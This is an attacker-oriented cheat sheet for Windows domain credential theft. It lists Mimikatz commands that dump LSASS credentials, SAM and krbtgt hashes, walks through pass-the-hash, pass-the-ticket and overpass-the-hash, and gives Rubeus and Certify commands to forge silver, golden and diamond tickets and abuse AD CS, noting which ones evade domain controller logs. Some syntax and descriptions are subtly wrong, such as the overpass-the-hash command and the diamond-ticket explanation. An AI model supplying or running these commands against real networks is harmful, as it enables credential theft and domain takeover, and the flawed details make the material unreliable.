# Mimikatz Commands Table

Below is a comprehensive table of **Mimikatz** commands for extracting **Kerberos keys**, **NTLM hashes**, and **Kerberos tickets**, organized by functionality and including examples for each command.

| **Category**                   | **Command**                                 | **Description**                                                                                       | **Example**                                  |
|--------------------------------|---------------------------------------------|-------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **Privilege Escalation**      | `privilege::debug`                          | Elevates privileges to allow access to sensitive memory areas where credentials are stored.            | `privilege::debug`                           |
|                                | `token::elevate /user:<username>`           | Elevates the current process token to that of the specified user, enabling access to their credentials.| `token::elevate /user:Administrator`         |
| **Dumping Credentials**       | `sekurlsa::logonpasswords`                  | Retrieves plaintext passwords, NTLM hashes, and Kerberos tickets from memory.                        | `sekurlsa::logonpasswords`                    |
|                                | `lsadump::sam`                              | Extracts NTLM hashes from the Security Account Manager (SAM) database.                               | `lsadump::sam`                                |
|                                | `lsadump::lsa /inject /name:krbtgt`         | Dumps the **krbtgt** account hash, which is used to generate Kerberos tickets.                       | `lsadump::lsa /inject /name:krbtgt`           |
| **Handling Kerberos Tickets**  | `kerberos::list /export`                    | Lists all Kerberos tickets currently in memory and exports them to a file.                           | `kerberos::list /export`                      |
|                                | `kerberos::ptt <ticket_file>`               | Injects a Kerberos ticket (.kirbi file) into the current session.                                   | `kerberos::ptt evil_ticket.kirbi`             |
|                                | `sekurlsa::tickets`                         | Displays all Kerberos tickets available in the current session.                                      | `sekurlsa::tickets`                           |
|                                | `sekurlsa::kerberos`                        | Retrieves Kerberos-related information, including tickets and keys, from memory.                     | `sekurlsa::kerberos`                          |
| **Exporting and Managing Keys**| `crypto::kerberos /export`                  | Exports Kerberos keys from the system for further analysis or use.                                   | `crypto::kerberos /export`                    |
| **Additional Commands**        | `exit`                                      | Exits the Mimikatz session.                                                                           | `exit`                                        |
|                                | `help`                                      | Displays help information for Mimikatz commands.                                                    | `help`                                        |

---
# User Impersonation Techniques

Below is a table comparing **Pass the Hash**, **Pass the Ticket**, and **Over Pass the Hash** techniques, highlighting their differences, appropriate use cases, and example syntaxes.

| **Technique**            | **Description & Differences**                                                                                                                                                                                                                               | **When to Use**                                                                                              | **Example Syntax**                                                                                                                                                  |
|--------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Pass the Hash (PtH)**  | **Description:** Utilizes captured NTLM hashes to authenticate as a user without needing the plaintext password. <br> **Differences:** Relies on NTLM hash values; does not involve Kerberos tickets.                                                    | When only NTLM hashes are available and Kerberos tickets are not feasible. Ideal for environments primarily using NTLM authentication. | ```bash <br> # Using Mimikatz to pass the hash <br> sekurlsa::logonpasswords <br> sekurlsa::pth /user:Username /domain:DOMAIN /ntlm:HASH /run:cmd.exe <br> ``` |
| **Pass the Ticket (PtT)**| **Description:** Involves the use of Kerberos ticket-granting tickets (TGTs) or service tickets to authenticate as a user. <br> **Differences:** Utilizes Kerberos tickets instead of NTLM hashes, allowing for more seamless authentication in Kerberos-enabled environments. | When Kerberos authentication is in use and you have access to valid Kerberos tickets. Suitable for environments where Kerberos is the primary authentication protocol. | ```bash <br> # Using Mimikatz to pass the ticket <br> kerberos::list <br> kerberos::ptt ticket.kirbi <br> ```                                                                  |
| **Over Pass the Hash (Pass the Key)** | **Description:** An advanced technique that combines Pass the Hash and Pass the Ticket by extracting Kerberos keys from the system and using them to create forged Kerberos tickets. <br> **Differences:** Extends PtH by leveraging Kerberos keys to generate valid tickets, enabling broader access and impersonation capabilities. | When both NTLM hashes and Kerberos keys are available, and there is a need to create more sophisticated and flexible authentication tokens. Useful in complex environments requiring high-level impersonation. | ```bash <br> # Using Mimikatz to perform Over Pass the Hash <br> sekurlsa::logonpasswords <br> kerberos::ptt /overpassthash:<hash> /user:Username /domain:DOMAIN <br> ```  |

---

## **Detailed Explanation**

### **1. Pass the Hash (PtH)**
- **Description:** Pass the Hash allows an attacker to authenticate as a user by using the NTLM hash of the user's password instead of the actual password. This technique is effective in environments where NTLM authentication is still prevalent.
- **When to Use:** Use PtH in networks where NTLM is commonly used and Kerberos authentication is not enforced or available.
- **Example Syntax:**
    ```plaintext
    # Using Mimikatz to pass the hash
    sekurlsa::logonpasswords
    sekurlsa::pth /user:Username /domain:DOMAIN /ntlm:HASH /run:cmd.exe
    ```

### **2. Pass the Ticket (PtT)**
- **Description:** Pass the Ticket leverages Kerberos tickets (TGTs or service tickets) to authenticate as a user. This method is suitable for environments that primarily use Kerberos for authentication.
- **When to Use:** Employ PtT in Kerberos-enabled environments where you have access to valid Kerberos tickets, allowing for more seamless and integrated authentication.
- **Example Syntax:**
    ```plaintext
    # Using Mimikatz to pass the ticket
    kerberos::list
    kerberos::ptt ticket.kirbi
    ```

### **3. Over Pass the Hash (Pass the Key)**
- **Description:** Over Pass the Hash is an advanced technique that combines aspects of both PtH and PtT. It involves extracting Kerberos keys from the system and using them to forge Kerberos tickets, thereby expanding the capabilities of user impersonation.
- **When to Use:** Utilize Over Pass the Hash in complex environments where both NTLM hashes and Kerberos keys are accessible. This technique is useful for creating sophisticated authentication tokens and gaining broader access.
- **Example Syntax:**
    ```plaintext
    # Using Mimikatz to perform Over Pass the Hash
    sekurlsa::logonpasswords
    kerberos::ptt /overpassthash:<hash> /user:Username /domain:DOMAIN
    ```

---

## Comprehensive Example Workflow

Here's an example workflow that combines multiple commands to extract NTLM hashes and Kerberos tickets:

1. **Elevate Privileges:**
    ```plaintext
    privilege::debug
    ```

2. **Dump Credentials:**
    ```plaintext
    sekurlsa::logonpasswords
    ```

3. **List and Export Kerberos Tickets:**
    ```plaintext
    kerberos::list /export
    ```

4. **Export Kerberos Keys:**
    ```plaintext
    crypto::kerberos /export
    ```

5. **Dump NTLM Hashes:**
    ```plaintext
    lsadump::sam
    ```

6. **Dump krbtgt Hash:**
    ```plaintext
    lsadump::lsa /inject /name:krbtgt
    ```

7. **Inject a Kerberos Ticket:**
    ```plaintext
    kerberos::ptt evil_ticket.kirbi
    ```

---

# Kerberos Attack Techniques Comparison

| **Technique**           | **What Is It?**                                                                                                                                                                                                 | **When to Use**                                                                                                                                                                                                          | **Why Use This Approach?**                                                                                                                                                                                                                                                                                                                                                                                                                                | **Basic Steps**                                                                                                                                                                                                                                       | **Example Commands/Tools**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
|-------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Silver Ticket**       | A **forged Ticket Granting Service (TGS) ticket** for a specific service (e.g., CIFS) using the **service account’s** NTLM or AES key.                                                                               | When you have access to a **service account’s hash/AES key** and want **persistent or stealthy access** to a **specific service** without alerting the Domain Controller (DC).                                              | - **Offline** creation: Does not require interaction with the DC.<br>- **Stealthier**: Bypasses DC logs.<br>- **Limited scope**: Only grants access to the targeted service, reducing detection chances compared to domain-wide attacks.                                                                                                                                                                                                                      | 1. **Acquire service account hash/AES key** (e.g., via Mimikatz DCSync, secretsdump.py).<br>2. **Obtain the target user’s SID**.<br>3. **Forge the TGS** using Rubeus or Mimikatz.<br>4. **Inject/Import the ticket** into your session.                                                                                                                                                     | - **Dump Service Account Keys** (Mimikatz):<br>  `mimikatz.exe "privilege::debug" "lsadump::dcsync /user:svc_cifs" "exit"`<br>- **Forge Silver Ticket** (Rubeus):<br>  `Rubeus.exe silver /service:cifs/machine.domain /aes256:<key> /user:USER /domain:DOMAIN /sid:<SID> /nowrap`<br>- **Inject Ticket** (Mimikatz):<br>  `mimikatz.exe "kerberos::ptt cifs.kirbi" exit` |
| **Golden Ticket**       | A **forged Ticket Granting Ticket (TGT)** for **any user** in the domain, created using the **krbtgt account’s** NTLM or AES key.                                                                                        | When you need **domain-wide access**, especially after **compromising the krbtgt account’s hash/AES key**, allowing you to impersonate any user and access any service within the domain.                                               | - **Domain-wide impact**: Grants the ability to impersonate any user, including Domain Admins.<br>- **Persistence**: Remains valid until the krbtgt password is changed.<br>- **Full control**: Can request service tickets for any service without restriction.                                                                                                                                                                                                              | 1. **Dump the krbtgt account’s hash/AES key** (via Mimikatz DCSync).<br>2. **Collect target user’s SID**.<br>3. **Forge the TGT** using Rubeus or Mimikatz.<br>4. **Inject the TGT** into memory.<br>5. **Access any domain resource** using the forged TGT.                                                                                                               | - **Dump krbtgt Key** (Mimikatz):<br>  `mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"`<br>- **Forge Golden Ticket** (Rubeus):<br>  `Rubeus.exe golden /aes256:<krbtgtkey> /user:<USER> /domain:<DOMAIN> /sid:<SID> /nowrap`<br>- **Inject Ticket** (Mimikatz):<br>  `mimikatz.exe "kerberos::ptt golden.kirbi" exit` |
| **Diamond Ticket**      | A **forged TGT** created by capturing a **delegation-based TGS (AP-REQ)** from the DC, decrypting it, modifying the PAC (Privilege Attribute Certificate), and re-encrypting it to produce a new TGT with custom group memberships. | When you can perform **Kerberos delegation** or have access to a **forwardable/delegable TGS** and want to create a **TGT with elevated privileges** without having the krbtgt hash.                                                       | - **No need for krbtgt hash**: Useful when the krbtgt account is secured.<br>- **Custom privileges**: Allows adding specific group memberships to the PAC.<br>- **Stealthy**: Limits the scope to desired privileges, reducing detection compared to Golden Tickets.                                                                                                                                                                                                 | 1. **Obtain a valid delegation TGS** (e.g., via Rubeus `diamond` command).<br>2. **Decrypt and modify the PAC** to include desired group memberships.<br>3. **Re-encrypt and forge the new TGT**.<br>4. **Inject the modified TGT** into memory.<br>5. **Utilize elevated privileges** within the domain.                                                                                                 | - **Forge Diamond Ticket** (Rubeus):<br>  `Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:<krbtgtkey> /nowrap`<br>- **Inject Ticket** (Rubeus):<br>  `Rubeus.exe ptt /ticket:<base64ticket>`<br>- **Optional Steal Token** (Rubeus):<br>  `Rubeus.exe steal /process:explorer`                                                                                 |
| **Forged Certificates** | Crafting **malicious certificates** (e.g., via AD CS misconfigurations) or forging **Smartcard/PKINIT** certificates to authenticate as a user or domain admin.                                                           | When **Active Directory Certificate Services (AD CS)** is misconfigured (e.g., ESC8, ESC1) or you can **issue user certificates** with elevated privileges, allowing certificate-based authentication without passwords.                   | - **Bypasses traditional authentication**: Uses certificate-based logins, avoiding reliance on passwords or NTLM hashes.<br>- **Stealthier**: Can blend with legitimate certificate traffic.<br>- **Versatile**: Useful in environments where certificate-based authentication is prevalent.                                                                                                                                                                                            | 1. **Identify misconfigured AD CS** (e.g., vulnerable templates).<br>2. **Request or forge a certificate** using tools like Certify.exe or Certipy.<br>3. **Use the certificate** to obtain a TGT via PKINIT or perform smartcard logins.<br>4. **Access domain resources** as the certificate-bound user.                                                                                                                     | - **Enumerate AD CS Vulnerabilities** (Certify.exe):<br>  `Certify.exe enumerate /vulnerable`<br>- **Request/Forge Certificate** (Certify.exe):<br>  `Certify.exe request /ca:CAName /template:VulnerableTemplate`<br>- **Obtain TGT with Certificate** (Rubeus):<br>  `Rubeus.exe asktgt /user:USER /certificate:C:\cert.pfx /password:CertPass /domain:DOMAIN`                                                                                                                                  |

---

## Key Takeaways

- **Silver Ticket**
  - **Scope**: Single service.
  - **Pros**: Stealthy, offline creation.
  - **Cons**: Limited to specific service access.

- **Golden Ticket**
  - **Scope**: Entire domain.
  - **Pros**: Full control, domain-wide access.
  - **Cons**: Requires krbtgt hash, high visibility.

- **Diamond Ticket**
  - **Scope**: Customized TGT with specific privileges.
  - **Pros**: Elevated privileges without krbtgt, stealthier than Golden.
  - **Cons**: Requires delegation-based TGS access.

- **Forged Certificates**
  - **Scope**: Certificate-based authentication.
  - **Pros**: Bypasses password-based defenses, stealthy.
  - **Cons**: Requires AD CS misconfigurations or CA compromises.

